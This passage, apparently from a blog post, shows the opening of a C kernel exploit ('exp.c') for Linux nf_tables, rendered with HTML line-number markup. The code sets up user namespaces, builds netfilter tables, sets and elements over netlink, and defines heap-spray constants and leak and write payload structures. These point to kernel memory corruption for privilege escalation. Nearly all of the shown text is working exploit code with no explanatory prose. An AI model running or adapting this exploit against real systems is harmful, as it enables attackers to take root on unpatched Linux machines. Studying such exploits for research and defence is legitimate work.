class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -o exp -l mnl -l nftnl -w</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libmnl/libmnl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/chain.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/expr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/rule.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/table.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/set.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter/nf_tables.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter/nfnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ethtool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sockios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREFIX_BUF_LEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RCU_HEAD_LEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC64_KEYLEN (64 - 8 - 12 - 16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_PAYLOAD_SIZE (32 + 1 - 24)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORRUPT_SIZE 0x8000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_KEY_CNT 150</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE_HOLE_STEP 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC64_PAGE_CNT ((32 + 8) / 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_SPRAY_CNT 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_FENGSHUI_CNT 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_FREE_HOLE_STEP 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">leak_payload</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> prefix[PREFIX_BUF_LEN];</span><br><span class="line">    <span class="keyword">uint8_t</span> rcu_buf[RCU_HEAD_LEN];</span><br><span class="line">    <span class="keyword">uint16_t</span> len;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_payload</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> prefix[PREFIX_BUF_LEN];</span><br><span class="line">    <span class="keyword">void</span> *pg_vec;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">uid_t</span> uid, <span class="keyword">gid_t</span> gid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(temp, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cpu_affinity</span><span class="params">(<span class="keyword">int</span> cpu_n, <span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">    CPU_SET(cpu_n, &amp;<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(pid, <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_table</span><span class="params">(struct mnl_socket *nl, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_table</span> *<span class="title">table</span> =</span> nftnl_table_alloc();</span><br><span class="line"></span><br><span class="line">    nftnl_table_set_str(table, NFTNL_TABLE_NAME, name);</span><br><span class="line">    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_expr</span> *<span class="title">exprs</span>[128];</span></span><br><span class="line">    <span class="keyword">int</span> exprid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[MNL_SOCKET_BUFFER_SIZE * <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> *<span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line">    <span class="keyword">int</span> table_seq = seq;</span><br><span class="line"></span><br><span class="line">    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">                                      NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_table_nlmsg_build_payload(nlh, table);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line">    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nl == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] new table %s\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">                          mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_set</span><span class="params">(struct mnl_socket *nl, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> key_len, <span class="keyword">int</span> data_len, <span class="keyword">int</span> data_type, <span class="keyword">char</span> *table_name, <span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> *<span class="title">set_stable</span> =</span> nftnl_set_alloc();</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_NAME, name);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, key_len);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_DATA_LEN, data_len);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_DATA_TYPE, data_type);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_FLAGS, NFT_SET_MAP);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_FAMILY, family);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_ID, id);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_expr</span> *<span class="title">exprs</span>[128];</span></span><br><span class="line">    <span class="keyword">int</span> exprid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[MNL_SOCKET_BUFFER_SIZE * <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> *<span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line"></span><br><span class="line">    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">                                    NFT_MSG_NEWSET, family,</span><br><span class="line">                                    NLM_F_CREATE | NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_set_nlmsg_build_payload(nlh, set_stable);</span><br><span class="line">    nftnl_set_free(set_stable);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nl == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] setting stable %s and set\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">                          mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_setelem</span><span class="params">(struct mnl_socket *nl, <span class="keyword">char</span> *key_buf, <span class="keyword">int</span> key_len, <span class="keyword">char</span> *data_buf, <span class="keyword">int</span> data_len, <span class="keyword">char</span> *set_name, <span class="keyword">char</span> *table_name, <span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> *<span class="title">set_stable</span> =</span> nftnl_set_alloc();</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_NAME, set_name);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_ID, id);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set_elem</span> *<span class="title">element</span> =</span> nftnl_set_elem_alloc();</span><br><span class="line">    nftnl_set_elem_set(element, NFTNL_SET_ELEM_KEY, key_buf, key_len);</span><br><span class="line">    nftnl_set_elem_set(element, NFTNL_SET_ELEM_DATA, data_buf, data_len);</span><br><span class="line"></span><br><span class="line">    